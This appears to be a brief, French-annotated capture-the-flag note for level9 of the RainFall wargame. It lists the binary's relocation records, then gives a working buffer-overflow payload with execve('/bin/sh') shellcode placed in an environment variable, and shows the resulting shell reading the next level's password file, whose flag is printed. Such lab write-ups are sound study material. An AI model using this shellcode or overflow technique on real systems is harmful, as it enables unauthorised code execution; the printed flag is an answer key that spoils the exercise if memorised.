@@ -1,0 +1,31 @@
+Nous trouvons des appelles de librairie exterieur
+
+./level9:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049b40 R_386_GLOB_DAT    __gmon_start__
+08049b80 R_386_COPY        _ZTVN10__cxxabiv117__class_type_infoE
+08049b50 R_386_JUMP_SLOT   __cxa_atexit
+08049b54 R_386_JUMP_SLOT   __gmon_start__
+08049b58 R_386_JUMP_SLOT   _ZNSt8ios_base4InitC1Ev
+08049b5c R_386_JUMP_SLOT   __libc_start_main
+08049b60 R_386_JUMP_SLOT   _exit
+08049b64 R_386_JUMP_SLOT   _ZNSt8ios_base4InitD1Ev
+08049b68 R_386_JUMP_SLOT   memcpy
+08049b6c R_386_JUMP_SLOT   strlen
+08049b70 R_386_JUMP_SLOT   _Znwo
+
+
+
+
+r $(python -c 'print "."*108 + "\xe2\xf8\xff\xbf"')j
+
+
+level9@RainFall:~$ USER=$(python -c 'print "\x30\xf9\xff\xbf\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
+level9@RainFall:~$ ./a.out USER ./level9
+USER will be at 0xbffff952
+level9@RainFall:~$ USER=$(python -c 'print "\x56\xf9\xff\xbf\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')
+level9@RainFall:~$ ./level9 $(python -c 'print "."*108 + "\x52\xf9\xff\xbf"')
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
